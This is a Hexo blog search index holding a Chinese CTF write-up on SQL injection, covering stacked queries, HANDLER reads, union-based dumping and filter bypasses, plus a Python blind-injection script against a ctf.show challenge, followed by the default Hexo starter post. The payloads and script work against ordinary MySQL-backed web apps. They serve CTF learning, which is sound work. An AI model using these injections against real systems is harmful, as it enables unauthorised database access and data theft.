<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>sql注入</title>
    <link href="/2025/01/17/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/01/17/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>1.[GYCTF2020]Blacklist<br> 题目<br> <br> 猜测是SQL注入，直接输入1’试试<br> <br> 确定为SQL注入，联合注入，查询数据库的字段数 1’ union select 1,2,3# ，出现类似黑名单的东西，过滤了部分关键词，尝试堆叠注入。<br> <br> 爆数据库：1’;show databases;#<br> <br> 爆表名：1’;show tables;#<br> <br> 爆FlagHere中的字段：1’;show columns from <code>FlagHere</code>;#<br> <br> 找到了flag,因为爆数据的关键词被过滤了，所以这里用handlar命令来获取flag:<br> 1’;HANDLER FlagHere OPEN;HANDLER FlagHere READ NEXT;HANDLER FlagHere CLOSE;#</p><p> handler命令参考链接：<a href="https://blog.csdn.net/jesseyoung/article/details/40785137">https://blog.csdn.net/jesseyoung/article/details/40785137</a><br> </p><p>2.ctf.show——web2<br> 题目：<br> <br> 输入万能语句进行注入，1’ or ‘1&#x3D;&#x3D;1’ #，密码随意输入，出现回显“欢迎你，ctfshow”，所以用户名就是“ctfshow”，所以存在SQL注入。<br> <br> 测试回显位置：1’ union select 1,2,3#，所以2就是回显位置。<br> <br> 爆数据库名称：1’ union select 1,database(),3 #，所以数据库名为web2<br> <br> 爆表名：1 ‘ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’web2’),3 #，密码还是随意，回显出现表名flag<br> <br> 爆flag中的字段名：1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;’web2’ and table_name&#x3D;’flag’),3 #,所以只有一个flag字段。<br> <br> 最后爆数据： 1’ union select 1,(select flag from flag),3 #,就获得了flag。<br> </p><p>3.ctf.show_web6<br> 题目：<br> <br> 我们先进行常规注入，输入万能语句1’ or ‘1&#x3D;&#x3D;1’ #，发现有些字符被过滤了，并且过滤了空格,我们可以使用括号()或者注释&#x2F;<strong>&#x2F;绕过。<br> <br> 查字段：admin’&#x2F;</strong>&#x2F;union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;1,2,3#,密码随意，发现回显为2，所以是可行的。<br> <br> 爆数据库名称：admin’&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;select&#x2F;<strong>&#x2F;1,database(),3#，此时的数据库名为web2<br> <br> 爆表名：password&#x3D;admin’&#x2F;</strong>&#x2F;or&#x2F;<strong>&#x2F;1&#x3D;1&#x2F;</strong>&#x2F;union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;1,group_concat(table_name),3&#x2F;<strong>&#x2F;from&#x2F;</strong>&#x2F;information_schema.tables&#x2F;<strong>&#x2F;where&#x2F;</strong>&#x2F;table_schema&#x3D;’web2’#<br> <br> 爆flag中的字段名：password&#x3D;admin’&#x2F;<strong>&#x2F;or&#x2F;</strong>&#x2F;1&#x3D;1&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;select&#x2F;<strong>&#x2F;1,group_concat(column_name),3&#x2F;</strong>&#x2F;from&#x2F;<strong>&#x2F;information_schema.columns&#x2F;</strong>&#x2F;where&#x2F;<strong>&#x2F;table_name&#x3D;’flag’#<br> <br> 最后爆数据：admin’&#x2F;</strong>&#x2F;or&#x2F;<strong>&#x2F;1&#x3D;1&#x2F;</strong>&#x2F;union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;1,flag,3&#x2F;<strong>&#x2F;from&#x2F;</strong>&#x2F;flag#，得到flag<br> </p><p>4.ctf.show_web7<br> 题目：<br> <br> 随意打开一篇文章，发现存在id传参，所以本题考查的是SQL盲注。<br> <br> 尝试注入id&#x3D;1’ or ‘1&#x3D;&#x3D;1’ #，发现有过滤。而注入 id&#x3D;1’or’1&#x3D;&#x3D;1’#后回显正常，所以是过滤了空格，可以用&#x2F;<strong>&#x2F;绕过。<br> <br> <br> 注入点为数值型注入,可以尝试联合注入进行脱库，此处id传入负数,后端根据id查询不到内容,就只能展示联合查询的结果，即判断回显位置。<br>  id&#x3D;-1&#x2F;</strong>&#x2F;union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;1,2,3#<br> <br> 爆数据库名：id&#x3D;-1&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;select&#x2F;<strong>&#x2F;1,database(),3#,所以此时的数据库为web7。<br> <br> 爆表名：id&#x3D;-1&#x2F;</strong>&#x2F;union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;1,(select&#x2F;<strong>&#x2F;group_concat(table_name)from&#x2F;</strong>&#x2F;information_schema.tables&#x2F;<strong>&#x2F;where&#x2F;</strong>&#x2F;table_schema&#x3D;”web7”),3#<br> <br> 爆字段：id&#x3D;-1&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;select&#x2F;<strong>&#x2F;1,(select&#x2F;</strong>&#x2F;group_concat(column_name)from&#x2F;<strong>&#x2F;information_schema.columns&#x2F;</strong>&#x2F;where&#x2F;<strong>&#x2F;table_schema&#x3D;”web7”&#x2F;</strong>&#x2F;and&#x2F;<strong>&#x2F;table_name&#x3D;”flag”),3#,只有一个flag字段<br> <br> 爆数据： id&#x3D;-1&#x2F;</strong>&#x2F;or&#x2F;<strong>&#x2F;1&#x3D;1&#x2F;</strong>&#x2F;union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;1,flag,3&#x2F;<strong>&#x2F;from&#x2F;</strong>&#x2F;flag#,成功拿到flag。<br> <br> 这一题也可以参考大佬的做法，直接用脚本跑出flag<br> ctfshow—web—web7 - anweilx - 博客园</p><p>5.ctf.show_web8<br> 题目：<br> <br> 这一题和ctf.show_web7很相似，但这次过滤的内容更多。<br> <br> 所以需要简单测试一下,将id后面的参数依次改为单引号，union，and，select等必要字符。<br> <br> 经过多次测试，总结了一下过滤表。<br>     空格                 —— 可以使用括号() 或者注释&#x2F;**&#x2F; 绕过。</p><pre><code class="hljs"> and                  —— 可以使用or或者 || ，或者 &amp;&amp;替代。 单引号             —— 被过滤的话，字符型注入就不可行了，数字型注入可以。 逗号                 —— 可以使用特殊语法绕过, 比如:substr(database(),1,1) 可以用                                  substr(database() from 1 for 1)来代替。 union               —— 可以用盲注替代联合注入，可以用 || 或者&amp;&amp;。</code></pre><p>因为过滤的字符太多了，手工进行注入太麻烦，所以建议用脚本进行爆破。</p><p>import requests</p><p>url &#x3D; “<a href="http://cb3870a1-df1c-4147-b0e9-bd6d0a5706a6.challenge.ctf.show/index.php?id=-1">http://cb3870a1-df1c-4147-b0e9-bd6d0a5706a6.challenge.ctf.show/index.php?id=-1</a>“<br>flag &#x3D; “”</p><p>for num in range(1,60):<br>    l &#x3D; 33<br>    r &#x3D; 130<br>    mid &#x3D; (l+r)&gt;&gt;1<br>    while l&lt;r:<br>        # 数据库：web8<br>        # sql &#x3D; “ascii(substr((select&#x2F;<strong>&#x2F;database())&#x2F;<strong>&#x2F;from&#x2F;</strong>&#x2F;{}&#x2F;<strong>&#x2F;for&#x2F;</strong>&#x2F;1))&gt;{}”.format(num,mid)<br>        # 表：flag,page,user<br>        # sql &#x3D; “ascii(substr((select&#x2F;</strong>&#x2F;group_concat(table_name)&#x2F;<strong>&#x2F;from&#x2F;</strong>&#x2F;information_schema.tables&#x2F;<strong>&#x2F;where&#x2F;</strong>&#x2F;table_schema&#x3D;database())&#x2F;<strong>&#x2F;from&#x2F;</strong>&#x2F;{}&#x2F;<strong>&#x2F;for&#x2F;</strong>&#x2F;1))&gt;{}”.format(num,mid)<br>        # 列：flag<br>        # sql &#x3D; “ascii(substr((select&#x2F;<strong>&#x2F;group_concat(column_name)&#x2F;</strong>&#x2F;from&#x2F;<strong>&#x2F;information_schema.columns&#x2F;</strong>&#x2F;where&#x2F;<strong>&#x2F;table_name&#x3D;0x666c6167)&#x2F;</strong>&#x2F;from&#x2F;<strong>&#x2F;{}&#x2F;</strong>&#x2F;for&#x2F;<strong>&#x2F;1))&gt;{}”.format(num,mid)<br>        # ctfshow{b54332e2-57d2-47c4-933a-d455e9b7e950}<br>        sql &#x3D; “ascii(substr((select&#x2F;</strong>&#x2F;flag&#x2F;<strong>&#x2F;from&#x2F;</strong>&#x2F;flag)&#x2F;<strong>&#x2F;from&#x2F;</strong>&#x2F;{}&#x2F;<strong>&#x2F;for&#x2F;</strong>&#x2F;1))&gt;{}”.format(num,mid)</p><pre><code class="hljs">    payload = url + &quot;/**/||/**/&quot; + sql    # print(payload)    res = requests.get(payload)        if &#39;If&#39; in res.text:        l = mid + 1    else:        r = mid    mid = (l+r)&gt;&gt;1if chr(mid)==&quot; &quot;:    breakflag += chr(mid)print(flag)</code></pre><p> 爆破得到flag<br> </p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>web</tag>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/01/14/hello-world/"/>
    <url>/2025/01/14/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
